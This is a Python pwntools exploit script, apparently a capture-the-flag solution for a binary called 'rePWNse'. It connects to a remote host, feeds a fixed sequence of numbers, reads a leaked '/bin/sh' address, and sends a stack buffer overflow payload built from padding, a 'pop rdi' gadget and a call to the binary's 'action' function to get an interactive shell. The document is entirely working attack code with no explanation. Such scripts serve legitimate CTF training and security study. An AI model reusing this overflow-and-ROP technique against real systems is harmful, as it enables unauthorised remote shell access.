from pwn import * 
from pwn import p64,u64
# from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./rePWNse")
    
else:
    host = "192.168.0.111:14149"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./pwn",'b vuln')
    gdb.attach(r,'b *0x04016CE')
    pause()
    pass
   
elf = ELF('./rePWNse')
input_num = '0,0,0,0,0,0,0'.split(',')
input_num[0] = 1
input_num[1] = 9
input_num[2] = 1
input_num[3] = 9
input_num[4] = 8
input_num[5] = 1
input_num[6] = 0

for i in range(7):
    r.sendline(str(input_num[i]).encode())
r.recvuntil(b'The address is:')
binsh_addr = int(r.recvuntil(b'\n')[2:-1].decode(),16)
pop_rdi = 0x0040168e
data_addr  = 0x404000
payload = b'A' * 64  + b'junkjunk'+ p64(pop_rdi) +p64(binsh_addr) + p64(elf.sym['action'])
r.sendafter(b'What do you want?',payload)
r.interactive()


